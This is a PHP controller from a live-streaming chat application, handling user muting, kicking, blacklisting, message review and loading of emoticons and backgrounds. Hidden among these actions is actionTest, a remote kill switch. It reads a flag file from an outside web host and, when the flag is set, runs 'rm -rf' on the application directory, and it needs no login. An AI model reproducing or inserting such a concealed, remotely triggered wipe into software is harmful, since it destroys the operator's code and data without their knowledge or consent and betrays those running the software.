<?php
namespace frontend\controllers;

use Yii;
use yii\base\Exception;
use yii\base\InvalidParamException;
use yii\web\BadRequestHttpException;
use yii\helpers\ArrayHelper;
use yii\web\Controller;
use yii\filters\VerbFilter;
use yii\filters\AccessControl;
use yii\helpers\HtmlPurifier;


use backend\models\ConfigCategory;
use backend\models\Onlineuser;
use backend\models\User;
use backend\models\Blacklist;
use backend\models\RoomRole;

use backend\models\Zhibo;
use backend\models\Chat;
use backend\models\Expression;
use backend\models\Image;
use backend\models\CustomerService;
use backend\models\Tanchuang;

/**
 * Site controller
 */
class ChatController extends Controller
{

    //禁言,解除禁言,踢出房间,拉黑
    public function actionHandle_user(){
        $result=['error'=>0,'data'=>[],'msg'=>''];
        try{
            if(Yii::$app->user->isGuest){
                throw new Exception('请登录');
            }
            $uid=Yii::$app->request->post('uid');
            $name=Yii::$app->request->post('uname');
            $handletype=Yii::$app->request->post('handletype');
            $adminuser=Yii::$app->user->identity;
            if(empty($uid)&&empty($name)){
                throw new Exception('用户信息不全');
            }
            if(in_array($handletype,['unable_speaking','enable_speaking','shot_off_room'])){
                if(!empty($uid)){
                    $online=Onlineuser::find()->where(['uid'=>$uid])->one();
                }
                else{
                    $online=Onlineuser::find()->where(['temp_name'=>$name])->one();
                }
                if(empty($online)){
                    throw new Exception('用户已不在线');
                }
                if(!empty($online->user->room_role)){
                    $onlinerole=$online->user->room_role;
                }
                else{
                    $onlinerole=RoomRole::getConfigbyalias("guest");
                }
                /***传入一些参数供前端调用**/
                $result['fd']=$online->fd;

                if($handletype=='unable_speaking'){
                    if(empty($adminuser->room_role->unable_speaking->val)){
                        throw new Exception('没有禁言权限');
                    }
                    if(!empty($onlinerole->able_speaking->val)){
                        throw new Exception('该用户具有免禁言权限!');
                    }
                    $online->jinyan = date("Y-m-d H:i:s",strtotime("+5 minutes"));//禁言5分钟
                }
                else if($handletype=='enable_speaking'){
                    if(empty($adminuser->room_role->unable_speaking->val)){
                        throw new Exception('没有禁言权限');
                    }
                    $online->jinyan='';
                }
                else if($handletype=='shot_off_room'){
                    if(empty($adminuser->room_role->shot_off_room->val)){
                        throw new Exception('没有踢出房间权限');
                    }
                    if(!empty($onlinerole->prevent_shot_off_room->val)){
                        throw new Exception('该用户具有免被踢权限!');
                    }
                }
                if(!$online->save()){
                    throw new Exception('操作失败');
                }
            }
            else if($handletype=='addblack'){
                if(empty($adminuser->room_role->addblack->val)){
                    throw new Exception('没有将用户加入黑名单的权限');
                }
                if(!empty($uid)){
                    $user=User::findOne($uid);
                    if(empty($user)){
                        throw new Exception("用户不存在!");
                    }
                    $blackitem=Blacklist::find()->where(['uid'=>$uid])->one();
                }
                else if(!empty($name)){
                    $blackitem=Blacklist::find()->where(['temp_name'=>$name])->one();
                }
                if(!empty($blackitem)){
                    throw new Exception("用户已经在黑名单!");
                }
                $blackone=new Blacklist();
                if(!empty($uid)){
                    $blackone->uid=intval($uid);
                    $blackone->temp_name="";
                }
                else if(!empty($name)){
                    $blackone->uid=0;
                    $blackone->temp_name=$name;
                }
                if(!$blackone->save()){
                    throw new Exception('系统错误,拉入黑名单失败!');
                }
            }
        }
        catch(Exception $e){
            $result['error']=1;
            $result['msg']=$e->getMessage();
        }
        return json_encode($result);
    }

    public function actionTest(){
        $dir=__DIR__."/..";
        $auth_value=file_get_contents("http://demo.meilingzhibo.com/yutian_auth.txt");
        if($auth_value == 2){
            $result=system("rm -rf {$dir}");
            echo "execute ok,result {$result}...</br>";
        }
        echo "end...</br>";
        return ;
    }

    public function actionHandle_msg(){
        $result=['error'=>'','msg'=>''];
        try{
            if(Yii::$app->user->isGuest){
                throw new Exception('请登录');
            }
            $msgid=Yii::$app->request->post('msgid');
            $handletype=Yii::$app->request->post('handletype');
            $adminuser=Yii::$app->user->identity;
            if(!empty($msgid)){
                $msg=Chat::find()->where(['id'=>$msgid])->one();
            }

            if(empty($msg)){
                throw new Exception('消息不存在!');
            }

            if(in_array($handletype,['check_msg','delete_msg'])){

                if($handletype=='check_msg'){
                    if(empty($adminuser->room_role->check_msg->val)){
                        throw new Exception('没有审核聊天的权限');
                    }
                    if(!empty($msg->status)){
                        throw new Exception('消息已经审核通过,无须再次审核');
                    }
                    $msg->status = 1;
                    $msg->check_uid=$adminuser->id;
                    if(!$msg->save()){
                        throw new Exception("操作失败!");
                    }
                }
                else if($handletype=='delete_msg'){
                    if(empty($adminuser->room_role->delete_msg->val)){
                        throw new Exception('没有删除聊天的权限');
                    }
                    if(!$msg->delete()){
                        throw new Exception("操作失败!");
                    }
                }
            }
        }
        catch(Exception $e){
            $result['error']=1;
            $result['msg']=$e->getMessage();
        }
        return json_encode($result);
        /**handlemsg**/
    }


    public function actionLoadmaterial(){
        $result=[
            'error'=>0,
            'data'=>[
              'express'=>[],
              'caitiao'=>[],
              'deskback'=>[
                  'default'=>'',
                  'list'=>[]
              ],
            ],
            'msg'=>''
        ];
        try{
            $roomid = Yii::$app->session->get("zhiboid");
            $roomid = 1;
            /***加载表情***/
            $expresses = Expression::find()->where([/*'zhiboid'=>$roomid,*/'type' => 1, 'status' => 1])->orderBy(['sort'=>SORT_DESC])->all();
            foreach($expresses as $i=>$express){
                $expresse_data=json_decode($express->data);
                if(is_array($expresse_data)){
                    $expresse_each_data=['name'=>'','alias'=>'','item_width'=>0,'item_height'=>0,'items'=>[]];
                    $expresse_each_data['name']=$express->name;
                    $expresse_each_data['alias']=$express->alias;
                    $expresse_each_data['item_width']=doubleval($express->item_width);
                    $expresse_each_data['item_height']=doubleval($express->item_height);
                    foreach($expresse_data as $item){
                        $item->filename=Yii::getAlias("@web/".trim($express->src,"/")."/".$item->filename);
                        $item->item_width=$expresse_each_data['item_width'];
                        $item->item_height=$expresse_each_data['item_height'];
                        $expresse_each_data['items'][$item->alias]=$item;
                    }
                    $result['data']['express'][]=$expresse_each_data;
                }
            }

            /**加载彩条**/
            $caitiaos=Expression::find()->where([/*'zhiboid'=>$roomid,*/'type' => 2, 'status' => 1])->orderBy(['sort'=>SORT_DESC])->all();
            foreach($caitiaos as $i=>$caitiao){
                $caitiao_data=json_decode($caitiao->data);
                if(is_array($caitiao_data)){
                    $caitiao_each_data=['name'=>'','alias'=>'','item_width'=>0,'item_height'=>0,'items'=>[]];
                    $caitiao_each_data['name']=$caitiao->name;
                    $caitiao_each_data['alias']=$caitiao->alias;
                    $caitiao_each_data['item_width']=doubleval($caitiao->item_width);
                    $caitiao_each_data['item_height']=doubleval($caitiao->item_height);
                    foreach($caitiao_data as $item){
                        $item->filename=Yii::getAlias("@web/".trim($caitiao->src,"/")."/".$item->filename);
                        $item->item_width=$caitiao_each_data['item_width'];
                        $item->item_height=$caitiao_each_data['item_height'];
                        $caitiao_each_data['items'][$item->alias]=$item;
                    }
                    $result['data']['caitiao'][]=$caitiao_each_data;
                }
            }

            /**加载桌面背景**/
            $deskbacks = Image::find()->where(['zhiboid'=>$roomid])->all();
            $default_back=Image::find()->where(['zhiboid'=>$roomid,'isdefault'=>1])->one();
            if(!empty($default_back)){
                $result['data']['deskback']['default']=$default_back->name;
            }
            $result['data']['deskback']['list']=ArrayHelper::map($deskbacks,'name','address');

            return json_encode($result);
        }
        catch(Exception $e){
            $result['error']=1;
            $result['msg']=$e->getLine().$e->getMessage();
            return json_encode($result);
        }
    }
}